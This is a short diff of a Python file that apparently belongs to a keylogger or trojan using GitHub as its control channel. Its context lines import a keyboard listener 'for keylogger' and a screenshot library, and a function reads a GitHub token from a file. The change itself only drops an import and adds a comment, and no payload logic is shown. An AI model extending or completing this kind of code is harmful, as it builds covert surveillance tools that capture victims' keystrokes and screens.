@@ -2,7 +2,6 @@ import base64
 import github3
 import importlib
 import json
-import random
 import sys
 import threading
 import time
@@ -13,6 +12,7 @@ from pynput import keyboard  # Added for keylogger
 import pyautogui  # Added for screenshot functionality
 import os  # Added for file handling
 
+# Ensure github_connect is defined first
 def github_connect():
     with open('secret.txt') as f:
         token = f.read().strip()
